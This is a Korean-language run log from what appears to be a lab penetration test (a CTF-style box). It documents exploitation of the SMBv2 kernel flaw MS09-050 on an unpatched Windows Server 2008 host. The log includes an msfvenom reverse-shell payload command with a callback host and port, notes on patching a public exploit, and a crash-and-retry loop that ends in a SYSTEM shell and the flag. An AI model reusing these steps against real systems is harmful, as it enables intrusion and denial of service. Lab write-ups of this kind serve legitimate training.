# Internal (192.168.248.40) — run log 2026-08-21

## 결과
- **진입 성공(RCE 확인), 플래그 미확보.** MS09-050 / CVE-2009-3103 (`srv2.sys` SMBv2 커널 RCE).
- 셸을 한 번 잡았으나 조작 실수로 상실 → 재익스플로잇 반복이 `srv2.sys` 를 wedge → SMBv2 협상 불능 → 재진입 차단. **revert 필요.**

## 타임라인
- 00:52 `-p-` nmap 시작(tmux int_nmap). 00:53 targeted `smb-vuln-cve2009-3103` = VULNERABLE, dialects = SMBv1 + **2.0.2**.
- 00:53 `searchsploit ms09-050` → EDB 40280 복사, 소스 정독. shellcode 하드코딩 LHOST + pysmb 의존 확인.
- 00:54 `msfvenom windows/shell_reverse_tcp LHOST=192.168.45.207 LPORT=443` = 324B. PoC shellcode 교체(`ms09_050_revshell.py`).
- 00:55 listener nc :443 (tmux). try1/try2 = 콜백 없음. tcpdump 로 계층 분리: injection·rpcclient 트리거는 정상, **443 인바운드 0** → 페이로드 트리거 실패로 판정.
- 00:57 길이 필드(`0x39e`) 의심 → shellcode 를 354B(원본 길이)로 NOP 패딩(`ms09_050_revshell_pad.py`). python2 PEP-263 인코딩 에러는 sed 표현식으로 회피.
- 00:57 try3 = **콜백 성공**. `C:\Windows\system32>` 대화형 cmd. (listener_443.log 에 실측)
- 상실: 증거 명령을 `send-keys "... & ... | findstr ..."` 로 보냄 → `&` 가 `\&` 리터럴화 + 파이프로 셸 hang. 복구 시도 `send-keys C-c` 가 로컬 nc 를 죽여 tmux 세션째 소멸, 타겟 셸 FIN-WAIT-2.
- 00:59~01:27 try4~try8 재익스플로잇 = `NT_STATUS_IO_TIMEOUT`. `smb-protocols` 재확인 시 **2.0.2 소실**(SMBv1 만 남음) = srv2.sys wedge. 총 ~21분 자연복구 대기했으나 미복구. try8 최종 확인 = 여전히 실패.

## 근거 파일 (~/PG/Internal/)
- nmap.log, nmap_smbvuln.log(+.txt) — 취약 확인 + 정상 시 2.0.2 방언
- msfvenom_shellcode.txt — 페이로드 생성 원문
- exploits/40280.py(원본), ms09_050_revshell.py, **ms09_050_revshell_pad.py(검증본)**
- try1~try8 *.log — 시도별 원문, try2.pcap — 계층 분리 증거
- listener_443.log — **성공 콜백 + cmd 프롬프트 실측**
- traces_confirmed.log — 남긴 흔적

## 셸 컨텍스트
- 관측: 프롬프트 `C:\Windows\system32>`, 배너 `Microsoft Windows [Version 6.0.6001]`.
- [가정] 커널 익스플로잇이라 SYSTEM 이어야 하나 `whoami` 미캡처(셸 상실). 단정하지 않음.

## 총괄 판단 필요
1. **revert 요청** — SMBv2 복구는 재부팅뿐. revert 후 첫 셸에서 즉시 `type C:\Users\Administrator\Desktop\proof.txt`. PoC(`ms09_050_revshell_pad.py`)와 listener(tmux int_sh, :443)는 그대로 대기.
2. 후속을 다른 러너에 맡길지, 내가 revert 후 이어받을지.

## 태그 후보 (신설 보류, 보고만)
- `tech/win/kernel-exploit` — 현재 볼트에 `tech/lin/kernel-exploit`(linux)만 있고 windows 대응 leaf 없음. MS09-050 은 Windows 원격 커널 RCE. 등재 여부 총괄 판단 요청. 이번 노트엔 넣지 않았다.

---

# 2차 시도 (revert 이후) — 2026-08-21 01:42~01:50

## 결과: 여전히 실패. 그러나 원인이 정량적으로 특정됐다.

### 1. revert 는 반영되지 않았다 (정량 반증)
타겟 TCP timestamp(`TS val`)는 부팅 시 리셋되는 단조 카운터다.
- 00:56:05 → 6113 (`try2.pcap`)
- 01:42:33 → 284901 (`try9.pcap`)
- Δ278788 tick / Δ2788 s = **정확히 100.0 Hz, 리셋 없음**

01:35 경 재부팅이 있었다면 카운터가 리셋돼 4만대여야 한다. **재부팅은 일어나지 않았다.**
(예측 검산: 00:55:04 부팅 가정 시 01:42:34 에 2849초 → 284900. 실측 284901.)

### 2. srv2.sys 는 여전히 죽어 있다 — 메커니즘까지 특정
서버는 **negotiate 에 `SMB 2.002` 방언이 실렸을 때만** 응답 불능이다.
- `nmap --script smb-protocols/smb-os-discovery` (SMBv1 방언만 나열) → **정상**
- `smbclient --option='client max protocol=NT1'` → **`NT_STATUS_LOGON_FAILURE`** = 정상 세션
- Samba 기본(SMB2 방언 광고) → `NT_STATUS_IO_TIMEOUT`

### 3. PoC 트리거가 별개로 고장나 있었다 (본문 6장에 기록)
`rpcclient` 트리거가 Samba 의 SMB2 방언 광고 때문에 협상 실패. **injection 실패와 무관한 독립 결함.**
수정본: `exploits/ms09_050_revshell_pad_smbtrig.py` (smbclient + `client max protocol=NT1`).
트리거 정상 작동 확인(실제 인증 이벤트 발생) 후 4회 발사(try13~16) → **콜백 0건**.
→ 실패 지점은 트리거가 아니라 **injection**. SMBv2 공격면 소멸이 확정됐다.

## 반증한 것
1. **"Samba `client min protocol` 기본값이 SMB2 라서"** — 틀렸다. `testparm -sv` = `LANMAN1`. 문제는 `min` 이 아니라 **`max`**(SMB2 방언을 광고하는 쪽).
2. **"nmap 이 SMB2 를 못 보니 공격면이 죽었다"는 추론만으로는 부족했다** — 관리자 지적대로 두 경로는 다르다. PoC 를 직접 쏘고 트리거까지 고쳐본 뒤에야 injection 실패로 확정할 수 있었다. 결론은 같았지만 근거가 달라졌다.

## 총괄 판단 필요
**진짜 revert(재부팅)가 필요하다.** 1차 revert 는 반영되지 않았다 — 포털에서 재실행하고, 반영 여부를 **`nmap -p445 --script smb-protocols` 에 `2.0.2` 가 돌아오는지**로 확인한 뒤 재시도하라. 그게 돌아오면 첫 발에 셸이 붙는다(try3 실측).
재시도용 자산은 그대로 대기: PoC `ms09_050_revshell_pad_smbtrig.py`, 리스너 tmux `int_sh`(:443).

## 산출물
`~/PG/Internal/` = 31개. try9~try17 로그 + `try9.pcap` 추가. 삭제한 것 없음.

---

# 3차 시도 — 진짜 revert 이후. FLAG 확보. 2026-08-21 02:02~02:20

## 결과: 완료. flag f4afb9b13d59235cb9c8892707256f7d
- 셸: 대화형 cmd, **nt authority\system** (whoami 확인). 경로 C:\Users\Administrator\Desktop\proof.txt.
- 증거 한 화면: ~/PG/Internal/flag_evidence.txt (whoami/hostname/ipconfig/date + type). proof.txt(33B) 별도 저장.

## 이 박스의 진짜 성질 (6장 본체)
- **실패한 MS09-050 발사는 srv2.sys 를 BSOD → 호스트 ~90초 자동 재부팅 → SMBv2(2.0.2) 자동 복귀.**
  445 filtered->closed->open 사이클을 nmap 으로 실측(try21 이후). 수동 revert 불필요.
- 그래서 attempt_loop.sh 로 "2.0.2 뜰 때까지 대기 -> 1발 -> 콜백 없으면 재부팅 대기 -> 반복" 루프.
  매번 1~2 시도에 셸. 커널 메모리 파손이라 성공/크래시가 확정적이지 않다(운).
- 셸이 수 초만 사는 문제는 **nc stdin 을 미리 채워** 해결(listener_auto.sh): 콜백 4초 뒤 type proof.txt 자동 실행.

## harvest.ps1 — 실행 불가 (정직하게)
- Server 2008 SP1(비-R2)에 **PowerShell 미설치**. dir C:\Windows\System32\WindowsPowerShell = File Not Found.
- cmd 내장으로 대체 열거 -> harvest_admin.txt (234행). 핵심: whoami=SYSTEM, Hotfix(s)=N/A(전면 미패치),
  net user 6계정(aaron/jack/niky/tim/Administrator/Guest), SeImpersonate/SeDebug/SeCreateToken Enabled.
- 이미 SYSTEM(단발 진입=최고권한)이라 privesc 단계 없음. 두 권한레벨 비교 불가.

## 셸을 세 번 잃은 경위 (6장 재료)
1. Ctrl-C 를 tmux 페인에 보냄 -> 로컬 nc 사망(원격 셸 아님).
2. 파이프 + `&`(send-keys 가 `\&` 리터럴화) -> cmd hang.
3. 연결 직후 호스트 재-BSOD.
+ tmux kill-session 이 sudo nc 자식을 안 죽여 좀비 nc 가 다음 콜백을 가로챔 -> PID 특정 kill 로 해결.

## 정리 확인
- 내 tmux(int_*) 전부 종료, 내 sudo nc 전부 PID 특정 kill, http.server 종료.
- 공존한 다른 타겟(192.168.248.220) nc pid 373831-373838 **미접촉**. 광범위 pkill 미사용.
- 타겟에 파일 미생성(DownloadFile 실패). 로그 전량 보존. traces_confirmed.log 갱신.

## 노트
- status: unsolved -> solved. 상단요약/3장(셸+증거)/4장(SYSTEM 열거)/5장(플래그)/6장(자동재부팅·좁비nc) 채움.
- 산출물 ~/PG/Internal = 56개. 노트 225 -> 338행.
